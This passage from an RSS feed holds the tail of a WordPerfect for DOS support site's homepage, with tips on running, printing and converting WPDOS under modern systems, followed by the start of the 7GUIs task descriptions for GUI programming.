&lt;p&gt;WordPerfect for DOS can be used without serious difficulties under all versions of Windows, and WPDOS 6.x can use many of the TrueType fonts that Microsoft provides with Windows 9x, Me, NT, 2000, XP, Vista, and Windows 7, 8, and 10. Troubleshooting and other tips for Windows users may be found on this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/windows.html&quot;&gt;Windows page&lt;/a&gt;. Separate pages provide essential information on customizing the &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/shortcut.html&quot;&gt;WPDOS desktop shortcut&lt;/a&gt;, on running WPDOS under &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/windowsxp.html&quot;&gt;Windows NT, 2000, and XP&lt;/a&gt;, and on running WPDOS under &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/vista.html&quot; target=&quot;_blank&quot;&gt;Vista&lt;/a&gt;, &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/windowsseven.html&quot; target=&quot;_blank&quot;&gt;Windows 7&lt;/a&gt;,  &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/windowseight.html&quot;&gt;Windows 8&lt;/a&gt;, or &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/windowsten.html&quot;&gt;Windows 10&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This site offers a system that runs &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wpforusb.html&quot; target=&quot;_blank&quot;&gt;WordPerfect for DOS from a portable USB drive&lt;/a&gt; (a “thumb” drive) lets you use WPDOS on any Windows-based system, including 64-bit windows.&lt;/p&gt;
&lt;p&gt;Useful advice on &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/housekeeping.html&quot;&gt;Windows housekeeping&lt;/a&gt; for WPDOS users may be found on a separate page.&lt;/p&gt;
&lt;p&gt;A &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/medtrans.html&quot;&gt;survival guide for medical transcriptionists&lt;/a&gt; provides methods of using WPDOS with abbreviation-expander software under Windows.&lt;/p&gt;
&lt;p&gt;A wide range of information is also available on &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wptoword.html&quot;&gt;opening WordPerfect files in Microsoft Word,&lt;/a&gt; on automatic &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/converttoword.html&quot; target=&quot;_blank&quot;&gt;conversion of WordPerfect files to Word or PDF format&lt;/a&gt;, and on &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wpcsoftware.html#convert&quot;&gt;converting Microsoft Word files for use in WordPerfect&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;winprint&quot; id=&quot;winprint&quot;&gt;Windows-based WPDOS printing and faxing problems solved&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Extensive problem-solving advice on printing &lt;strong&gt;&lt;em&gt;under 32-bit Windows&lt;/em&gt;&lt;/strong&gt; may be found on a &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/winprint.html&quot;&gt;page about printing and faxing from WPDOS under Windows&lt;/a&gt;, so you can avoid mysterious crashes and extra pages containing nonsense characters. The same page includes advice on using Windows fonts in WPDOS 6.x and on &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/usbprint.html&quot;&gt;printing to a printer connected by a USB cable or across a network&lt;/a&gt;. (If your printer is a Windows-only printer, see the separate page on &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/methodsforanyprinter.html&quot;&gt;printing to any printer supported by Windows&lt;/a&gt;.) Multiple methods are provided for &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/pdfprint.html&quot;&gt;creating PDF files from WPDOS&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;Advanced techniques for accessing characters and symbols in &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/truetype.html&quot;&gt;multilingual TrueType fonts in WPDOS 6.x&lt;/a&gt; are on a page of their own. Other pages explain how to &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/typeinstall.html&quot; target=&quot;_blank&quot;&gt;install PostScript Type 1 fonts into WPDOS 5.1 and 6.x&lt;/a&gt; and how to install and use &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/speedo.html&quot; target=&quot;_blank&quot;&gt;Speedo soft fonts in WPDOS 6.x&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;anyprinter&quot; id=&quot;anyprinter&quot;&gt;Print to any Windows printer or fax software&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;This information applies to 32-bit Windows only; printing is effortless using this site's method of running WPDOS under 64-bit Windows.&lt;/em&gt; Using a combination freely-available programs, you can &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/methodsforanyprinter.html&quot;&gt;print from WPDOS to any printer supported by Windows&lt;/a&gt;, even if no WPDOS driver exists for the printer, and even if the printer is connected to your computer by a USB cable or across a network. This site offers a variety of methods for printing from WPDOS to any Windows printer, some of which can be set up automatically, some of which require complex manual setup. After any of these methods is first set up, however, it works automatically with no further effort from the user. A separate page explains how to use a similar method to &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/faxwin.html&quot;&gt;fax from WPDOS to any Windows fax software&lt;/a&gt; (under 32-bit Windows only).&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;graphicsinwindow&quot; id=&quot;graphicsinwindow&quot;&gt;WordPerfect for DOS graphics mode in a window on the Windows desktop&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;One problem with WPDOS under modern Windows systems is that Windows makes it impossible to use WPDOS's graphics mode in a window on the Window desktop. This means that print preview and image editing under WPDOS 5.1 and 6.x, and graphics-based text entry under WPDOS 6.x, can be used only when WPDOS is running full-screen under Windows XP or, through &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/windowsseven.html#fullscreen&quot;&gt;Ludwig Ertl's method&lt;/a&gt;, under 32-bit Windows 7. This site's methods of running WPDOS under modern Windows makes it possible to use WPDOS's graphics screens.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;wpmac&quot; id=&quot;wpmac&quot;&gt;WordPerfect for (and on) the Macintosh&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;WordPerfect for the Macintosh (a freely downloadable program) was written for older version of the Macintosh operating system, but it can be run on modern Intel-based Macs (or any Mac running OS X 10.6 or later) through the use of “emulation” software. A page on &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/mac-intel.html&quot;&gt;WordPerfect for the Mac on Intel-based Macs&lt;/a&gt; provides a complete system for running WPMac on Intel machines. Methods are provided for &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wpfilesinosx.html&quot;&gt;converting WPMac files to modern word-processing formats&lt;/a&gt;, or for converting modern word-processing files into WPMac format.&lt;/p&gt;
&lt;p&gt;Separate pages include methods for running WPDOS on Mac hardware, including the new &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/vdoswpmac.html&quot;&gt;vDosWP method&lt;/a&gt; and the older but still effective &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wpdosboxmac.html&quot;&gt;WPDOSBoxMac method&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;workarounds&quot; id=&quot;workarounds&quot;&gt;Work around the limitations of WordPerfect for DOS&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;WordPerfect for DOS has built-in limitations that will never be removed. Perhaps the most annoying is the program's inability to import GIF, JPEG, and other modern graphics formats; this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wpgformat.html&quot;&gt;WPG graphic format&lt;/a&gt; page provides ways of converting such formats into WordPerfect's WPG format. A separate &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/workaround.html&quot;&gt;workarounds&lt;/a&gt; page offer solutions for minor bugs and other inconveniences. A further page describes minor limitations in WPDOS related to &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/year2k.html&quot;&gt;Year 2000&lt;/a&gt; issues.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;euro&quot; id=&quot;euro&quot;&gt;WordPerfect and the euro symbol&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;The euro symbol was introduced after Corel stopped further development of WordPerfect for DOS. However, through the use of drivers, fonts, and other files available from the &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/euro.html&quot;&gt;euro page&lt;/a&gt; of this site, the euro symbol can be used in WPDOS 5.1 or 6.x. The most extensive support provided on this page is for HP LaserJet and other PCL-compatible printers, but the euro can also be printed with any other printer that supports graphics, and this site provides &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#printer&quot;&gt;drivers for newer HP, Lexmark, and other HP-compatible printers&lt;/a&gt; that have the euro symbol in the printer's hardware. Instructions on this site's euro page also make it possible to use the euro as a currency symbol in WPDOS 6.x tables.&lt;/p&gt;
&lt;p&gt;A separate page provides methods of &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/eurodos.html&quot;&gt;displaying and accessing the euro symbol in MS-DOS and Windows DOS&lt;/a&gt;, in both full-screen and windowed modes. These methods are designed mostly for users in Western Europe.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;graphicsmode&quot; id=&quot;graphicsmode&quot;&gt;Graphics mode survival guide&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;If you run WordPerfect for DOS under the vDosWP or DOSBoxWP emulators, you can use its graphics-mode print preview, page view, and graphics view (the latter two in WPDOS 6.x only). These modes require graphics driver files. vDosWP can only display 640x480 VGA graphics; DOSBoxWP supports all high-resolution video modes supported by WPDOS.&lt;/p&gt;
&lt;p&gt;The page includes a &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/graphicsmode.html#51vesa&quot;&gt;VESA graphics driver for WPDOS 5.1&lt;/a&gt; that gives 5.1 users the same high-resolution, low-flicker images available under WordPerfect for DOS 6.x. (For 32-bit Windows users, the page also includes a &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/graphicsmode.html#vesapatch&quot;&gt;patched WPDOS 6.x VESA VBE graphic driver for new video cards&lt;/a&gt; for use with some video boards that will not work with the original driver.)&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;textmode&quot; id=&quot;textmode&quot;&gt;Text mode survival guide&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;Information for 32-bit Windows only:&lt;/em&gt; The built-in text-mode font on many recent computers is less attractive and legible than the fonts on older machines. This site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/textmode.html&quot;&gt;text mode page&lt;/a&gt; provides a utility that can replace the text font used by full-screen DOS. The page also includes notes on using WPDOS in monochrome mode.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;addfeatures&quot; id=&quot;addfeatures&quot;&gt;Additional and under-documented features&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Some features that have been added to recent versions of WordPerfect for Windows can also be added to WPDOS through the use of macros. among the features available on this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/addfeatures.html&quot;&gt;additional features page&lt;/a&gt; are tools for copying and pasting text between WPDOS and Windows applications, “smart quotes” for WPDOS 5.1, Windows-style block selection for WPDOS 5.1, and a LineBreak code for WPDOS 6.x.&lt;/p&gt;
&lt;p&gt;WordPerfect for DOS is so packed with features that some were never described in the printed manuals or help files. They are only known through experimentation or because they were described only in the files distributed with some versions of the program that listed enhancements made in interim versions. Some of the most notable of these changes will be listed on this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/undoc.html&quot;&gt;underdocumented features page&lt;/a&gt;, together with the original lists of enhancements.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;year2k&quot; id=&quot;year2k&quot;&gt;Year 2000 compatibility&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;WordPerfect 5.1 and 6.x for DOS are generally free of Y2K problems, and accept four-digit years in almost all dialogs where you can enter dates. Details, and links to Corel's Y2K pages, may be found on this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/year2k.html&quot;&gt;year 2000 page&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;arabichebrew&quot; id=&quot;arabichebrew&quot;&gt;Arabic and Hebrew WordPerfect&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;A &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/arabicandhebrew.html&quot;&gt;page on this site&lt;/a&gt; includes notes on using the special Hebrew and Arabic versions of WordPerfect 5.1 for DOS. Please send &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/feedback.html&quot; target=&quot;_blank&quot;&gt;feedback&lt;/a&gt; if you have further information for this page.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;wpcutils&quot; id=&quot;wpcutils&quot;&gt;WordPerfect-related programs by WordPerfect Corporation and Corel&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;WordPerfect-related &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wpcsoftware.html&quot;&gt;utilities by WordPerfect and Corel&lt;/a&gt; are available either directly from this site or through links to other sites. These utilities include a conversion program that converts recent Microsoft Word files into WP 5.1 and 6.x format, and (on a separate page) the WordPerfect &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/shell.html&quot;&gt;Shell, Editor, and other WordPerfect Office for DOS programs&lt;/a&gt;. Another page includes links and compatibility information on &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/datadrawplan.html&quot;&gt;DataPerfect, DrawPerfect, PlanPerfect, WP Presentations, and WP Works&lt;/a&gt;. For nostalgic visitors, a &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/chronology.html&quot;&gt;chronology of WordPerfect software&lt;/a&gt; is available for browsing.&lt;/p&gt;
&lt;p&gt;This site does not provide support WordPerfect for Windows, but, for the convenience of users, some notes about compatibility with current Windows versions have been provided for &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/oldwpwin.html&quot;&gt;older versions of WordPerfect for Windows&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;thirdparty&quot; id=&quot;thirdparty&quot;&gt;Third-party tools and other software&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Many &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/tools.html&quot;&gt;third-party freeware and shareware tools&lt;/a&gt; have been developed for use with WPDOS. Among those that can be obtained from this site are TrueType for WordPerfect, by LaserTools, the font-installation modules of PrimeType for WordPerfect, also by LaserTools, utilities for repairing and viewing WordPerfect files, and utilities for removing password-protection from WordPerfect 5.0 and 5.1 files (together with links to commercial software that removes password-protection from WP 6.x files).&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;ftplinks&quot; id=&quot;ftplinks&quot;&gt;Discussion forums, FTP sites, and other links&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;This site includes a miscellaneous list of &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/links.html&quot;&gt;links to Corel and other WPDOS sites&lt;/a&gt;, including Corel's files and patches for WPDOS, bulletin board sites where WPDOS can be discussed, and other sites of interest.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;obtain&quot; id=&quot;obtain&quot;&gt;How to obtain WordPerfect for DOS&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;A note on this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/links.html#obtain&quot;&gt;tools and links page&lt;/a&gt; provides a link to a source from whom you can buy legal copies of WordPerfect for DOS 5.1+ and WordPerfect for DOS 6.2. Another note provides a link to any current eBay auctions for all versions of WPDOS.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;patch&quot; id=&quot;patch&quot;&gt;WordPerfect 6.2 patch program&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Some development work continued on WordPerfect for DOS after the final public release of WPDOS 6.2. A &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/patch62.html&quot;&gt;patch program&lt;/a&gt; available on this site will update the final public version to the final internal version, which was never released, but includes some minor changes that make it worthwhile (and at least two bugs that you may want to avoid).&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;linuxnote&quot; id=&quot;linuxnote&quot;&gt;WordPerfect under Linux&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Instructions for running WPDOS under Linux may be found on this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/linux.html&quot;&gt;Linux page&lt;/a&gt;. This page was updated in 2020 with details about the highly effective dosemu2 emulation software&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;forcoreltodo&quot; id=&quot;forcoreltodo&quot;&gt;What Corel should have done&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Corel abandoned a small but potentially significant source of income when it stopped development of WordPerfect for DOS, and it strained the good will of many of its most loyal customers. What Corel should have done (but never will do) was work toward making a slightly updated version of WPDOS available for downloading at a reasonable price; no retail boxes would be involved. One or two of the original programmers should have been rehired to add the following enhancements for WPDOS running under Windows:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Support for Windows-style long file names for documents (technically feasible)&lt;/li&gt;
&lt;li&gt;Support for sending data to and from the Windows clipboard (technically feasible)&lt;/li&gt;
&lt;li&gt;Support for printing to USB printers (technically difficult but possible)&lt;/li&gt;
&lt;li&gt;Support for the euro symbol (trivially easy; details are listed under &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/euro.html#unfinished&quot;&gt;unfinished business&lt;/a&gt; on this site's euro page)&lt;/li&gt;
&lt;li&gt;Y2K fixes (trivially easy)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;These enhancements would have encouraged many law firms, government offices, and others to continue buying WPDOS instead of switching to Microsoft Word. Corel could easily have earned back the small investment required.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;feedback&quot; id=&quot;feedback&quot;&gt;Feedback about this site&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;I am always happy to receive &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/feedback.html&quot;&gt;feedback and questions&lt;/a&gt;. Please see the &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/feedback.html&quot;&gt;feedback page&lt;/a&gt; for notes on the information that I will need about your system before I can provide any help. If you want to make a contribution to the maintenance of this site, please see the &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/voluntary.html&quot; target=&quot;_blank&quot;&gt;contributions page&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Computer and technical support personnel in educational institutions, corporations, or anywhere else should feel free to archive or copy all or part of this site for internal use, and any individual visitor should feel free to download all or part of this site for personal use. Please do not repost anything from this site in public without specific permission.&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;acknowledgments&quot; id=&quot;acknowledgments&quot;&gt;Acknowledgments&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Many visitors to this site have helped to improve it by generously offering corrections, suggestions, files, links, and other material, and by testing printer drivers and other files created for the site. Niek Campagne, John Gay, Bob Headrick, Robert Holmgren, Mark Lomax, Timothy J. McGowan, Michal Necasek, John Ogden, Lutz Reuter, Don Rolfson, Randy Spurrier, Haye van den Oever, Malcolm Wheatley, and Richard Wood deserve special thanks for their generosity and ingenuity.&lt;/p&gt;
&lt;p&gt;I also want to express my gratitude to Gianfranco Accardo, Tom Aiuppa, Sherrie Baumann, Keith Bernstein, the late Henk Bok, Jesse Bouma, Chris Butcher, Juan Miguel Campanario, Chris Condon, Janet Cyford, Douglas D'Angelo, Peter Das, Geert De Baets, Michael DeBusk, Tony Duff, Hans Olav Fekjær, Barbara Fields, Mark Fountain, David Garde, John Garziglia, Ian Gay, John Greenwood, Philip &lt;span class=&quot;nobr&quot;&gt;Griffin-Allwood,&lt;/span&gt; Marcy Grupp, Dr. Martin R. Hadam, Brian Hancock, H. F. G. F. Huijnen, Gregor J. Jones, Becky Jones, James Jones, Don Keeler, David Lasher, Timothy McGowan, Martin Malina, Paul Merrill, Tom Miller, Chris Moore, Elden Nelson, Matthias Paul, Ed Plowman, M. W. Poirier, Mitzi Ponce, Candace Primeaux, Eiji Primrose, John Rethorst, Carol Reese, Vicky Richardson, Ed Rippetoe, Brad Robertson, Edwin Russell, Frank Schaedlich, Stephen D. Schery, S. C. Schmidt, Chris Scott, George D. Selim, Jeannette R. Shearer, Ruth Sinclair, Charles Smith, Ron Smith, David Stanley, David Testardi, Udo Tjalsma, James Richard Tyrer, Gerard van Loenhout, Jack Waananen, Garry Wanlin, Martin Webb, Joe Weber, Betty Whiting, Paul Whiting, and Jerome Zimmerman. Some pages on this site have additional acknowledgments. My apologies to anyone whose name I have inadvertently omitted.&lt;/p&gt;
&lt;p class=&quot;note&quot;&gt;This site has no prejudices for or against any software vendor. I am happy to acknowledge my debt to Microsoft FrontPage, the program that made it easy for me to create these pages, and to &lt;a href=&quot;http://www.microsoft.com/expression/&quot; target=&quot;_blank&quot;&gt;Microsoft Expression Web&lt;/a&gt;, the program that has made it easy for me to maintain them. (However, the code on this page that displays this site's current RSS feed is from Adobe Dreamweaver because the corresponding code in Expression Web does not work with the Safari web browser.)&lt;/p&gt;
&lt;p class=&quot;note&quot;&gt;&lt;em&gt;Accessibility statement:&lt;/em&gt; This site conforms to most current accessibility standards. Images include descriptive text in image tags, and color is only used to convey information when the same information is conveyed as text. Two points should be noted: at the top of each page is a paragraph containing sequential links leading to other sections on the same page; and all links to pages outside this site will open in a separate browser window. If these or any other aspects of the site cause accessibility problems, please &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/feedback.html&quot;&gt;contact me&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;
&lt;/body&gt;</description>
<pubDate>Sun, 01 Nov 2020 12:45:16 +0000</pubDate>
<dc:creator>elvis70</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.columbia.edu/~em36/wpdos/</dc:identifier>
</item>
<item>
<title>7GUIs</title>
<link>https://eugenkiss.github.io/7guis/tasks/</link>
<guid isPermaLink="true" >https://eugenkiss.github.io/7guis/tasks/</guid>
<description>&lt;p&gt;The tasks were selected by the following criteria. The task set should be as small as possible yet reflect as many typical (or fundamental or representative) challenges in GUI programming as possible. Each task should be as simple and self-contained as possible yet not too artificial. Preferably, a task should be based on existing examples as that gives the task more justification to be useful and there already will be at least one reference implementation.&lt;/p&gt;
&lt;p&gt;Below, a description of each task highlighted with the challenges it reflects and a screenshot of the resulting GUI application in Java/Swing is given.&lt;/p&gt;
&lt;p&gt;For a live version of the tasks see my &lt;a target=&quot;_blank&quot; href=&quot;https://eugenkiss.github.io/7guis-React-TypeScript-MobX/&quot;&gt;React/MobX&lt;/a&gt; implementation.&lt;/p&gt;

&lt;h2 class=&quot;css-1isldpa&quot;&gt;Counter&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Challenge:&lt;/em&gt; Understanding the basic ideas of a language/toolkit.&lt;/p&gt;
&lt;img src=&quot;https://eugenkiss.github.io/7guis/static/counter.9cd92091.png&quot; class=&quot;css-a5rafi&quot;/&gt;&lt;p&gt;The task is to build a frame containing a label or read-only textfield &lt;em&gt;T&lt;/em&gt; and a button &lt;em&gt;B&lt;/em&gt;. Initially, the value in &lt;em&gt;T&lt;/em&gt; is “0” and each click of &lt;em&gt;B&lt;/em&gt; increases the value in &lt;em&gt;T&lt;/em&gt; by one.&lt;/p&gt;
&lt;p&gt;Counter serves as a gentle introduction to the basics of the language, paradigm and toolkit for one of the simplest GUI applications imaginable. Thus, Counter reveals the required scaffolding and how the very basic features work together to build a GUI application. A good solution will have almost no scaffolding.&lt;/p&gt;


&lt;h2 class=&quot;css-1isldpa&quot;&gt;Temperature Converter&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Challenges:&lt;/em&gt; bidirectional data flow, user-provided text input.&lt;/p&gt;
&lt;img src=&quot;https://eugenkiss.github.io/7guis/static/tempconv.de9aff1f.png&quot; class=&quot;css-a5rafi&quot;/&gt;&lt;p&gt;The task is to build a frame containing two textfields &lt;em&gt;T&lt;sub&gt;C&lt;/sub&gt;&lt;/em&gt; and &lt;em&gt;T&lt;sub&gt;F&lt;/sub&gt;&lt;/em&gt; representing the temperature in Celsius and Fahrenheit, respectively. Initially, both &lt;em&gt;T&lt;sub&gt;C&lt;/sub&gt;&lt;/em&gt; and &lt;em&gt;T&lt;sub&gt;F&lt;/sub&gt;&lt;/em&gt; are empty. When the user enters a numerical value into &lt;em&gt;T&lt;sub&gt;C&lt;/sub&gt;&lt;/em&gt; the corresponding value in &lt;em&gt;T&lt;sub&gt;F&lt;/sub&gt;&lt;/em&gt; is automatically updated and vice versa. When the user enters a non-numerical string into &lt;em&gt;T&lt;sub&gt;C&lt;/sub&gt;&lt;/em&gt; the value in &lt;em&gt;T&lt;sub&gt;F&lt;/sub&gt;&lt;/em&gt; is &lt;em&gt;not&lt;/em&gt; updated and vice versa. The formula for converting a temperature &lt;em&gt;C&lt;/em&gt; in Celsius into a temperature &lt;em&gt;F&lt;/em&gt; in Fahrenheit is &lt;em&gt;C = (F - 32) * (5/9)&lt;/em&gt; and the dual direction is &lt;em&gt;F = C * (9/5) + 32&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Temperature Converter increases the complexity of Counter by having bidirectional data flow between the Celsius and Fahrenheit inputs and the need to check the user input for validity. A good solution will make the bidirectional dependency very clear with minimal boilerplate code.&lt;/p&gt;
&lt;p&gt;Temperature Converter is inspired by the &lt;a target=&quot;_blank&quot; href=&quot;https://www.artima.com/pins1ed/gui-programming.html#32.4&quot;&gt;Celsius/Fahrenheit converter&lt;/a&gt; from the book &lt;em&gt;Programming in Scala&lt;/em&gt;. It is such a widespread example—sometimes also in the form of a currency converter—that one could give a thousand references. The same is true for the Counter task.&lt;/p&gt;


&lt;h2 class=&quot;css-1isldpa&quot;&gt;Flight Booker&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Challenge:&lt;/em&gt; Constraints.&lt;/p&gt;
&lt;img src=&quot;https://eugenkiss.github.io/7guis/static/bookflight.a5434663.png&quot; class=&quot;css-a5rafi&quot;/&gt;&lt;p&gt;The task is to build a frame containing a combobox &lt;em&gt;C&lt;/em&gt; with the two options “one-way flight” and “return flight”, two textfields &lt;em&gt;T&lt;sub&gt;1&lt;/sub&gt;&lt;/em&gt; and &lt;em&gt;T&lt;sub&gt;2&lt;/sub&gt;&lt;/em&gt; representing the start and return date, respectively, and a button &lt;em&gt;B&lt;/em&gt; for submitting the selected flight. &lt;em&gt;T&lt;sub&gt;2&lt;/sub&gt;&lt;/em&gt; is enabled iff &lt;em&gt;C&lt;/em&gt;’s value is “return flight”. When &lt;em&gt;C&lt;/em&gt; has the value “return flight” and &lt;em&gt;T&lt;sub&gt;2&lt;/sub&gt;&lt;/em&gt;’s date is strictly before &lt;em&gt;T&lt;sub&gt;1&lt;/sub&gt;&lt;/em&gt;’s then &lt;em&gt;B&lt;/em&gt; is disabled. When a non-disabled textfield &lt;em&gt;T&lt;/em&gt; has an ill-formatted date then &lt;em&gt;T&lt;/em&gt; is colored red and &lt;em&gt;B&lt;/em&gt; is disabled. When clicking &lt;em&gt;B&lt;/em&gt; a message is displayed informing the user of his selection (e.g. “You have booked a one-way flight on 04.04.2014.”). Initially, &lt;em&gt;C&lt;/em&gt; has the value “one-way flight” and &lt;em&gt;T&lt;sub&gt;1&lt;/sub&gt;&lt;/em&gt; as well as &lt;em&gt;T&lt;sub&gt;2&lt;/sub&gt;&lt;/em&gt; have the same (arbitrary) date (it is implied that &lt;em&gt;T&lt;sub&gt;2&lt;/sub&gt;&lt;/em&gt; is disabled).&lt;/p&gt;
&lt;p&gt;The focus of Flight Booker lies on modelling constraints between widgets on the one hand and modelling constraints within a widget on the other hand. Such constraints are very common in everyday interactions with GUI applications. A good solution for Flight Booker will make the constraints clear, succinct and explicit in the source code and not hidden behind a lot of scaffolding.&lt;/p&gt;
&lt;p&gt;Flight Booker is directly inspired by the &lt;a target=&quot;_blank&quot; href=&quot;http://blog.reactiveprogramming.org/?p=21&quot;&gt;Flight Booking Java example in Sodium&lt;/a&gt; with the simplification of using textfields for date input instead of specialized date picking widgets as the focus of Flight Booker is not on specialized/custom widgets.&lt;/p&gt;


&lt;h2 class=&quot;css-1isldpa&quot;&gt;Timer&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Challenges:&lt;/em&gt; concurrency, competing user/signal interactions, responsiveness.&lt;/p&gt;
&lt;img src=&quot;https://eugenkiss.github.io/7guis/static/timer.ed46b6b4.png&quot; class=&quot;css-a5rafi&quot;/&gt;&lt;p&gt;The task is to build a frame containing a gauge &lt;em&gt;G&lt;/em&gt; for the elapsed time &lt;em&gt;e&lt;/em&gt;, a label which shows the elapsed time as a numerical value, a slider &lt;em&gt;S&lt;/em&gt; by which the duration &lt;em&gt;d&lt;/em&gt; of the timer can be adjusted while the timer is running and a reset button &lt;em&gt;R&lt;/em&gt;. Adjusting &lt;em&gt;S&lt;/em&gt; must immediately reflect on &lt;em&gt;d&lt;/em&gt; and not only when &lt;em&gt;S&lt;/em&gt; is released. It follows that while moving &lt;em&gt;S&lt;/em&gt; the filled amount of &lt;em&gt;G&lt;/em&gt; will (usually) change immediately. When &lt;em&gt;e ≥ d&lt;/em&gt; is true then the timer stops (and &lt;em&gt;G&lt;/em&gt; will be full). If, thereafter, &lt;em&gt;d&lt;/em&gt; is increased such that &lt;em&gt;d &amp;gt; e&lt;/em&gt; will be true then the timer restarts to 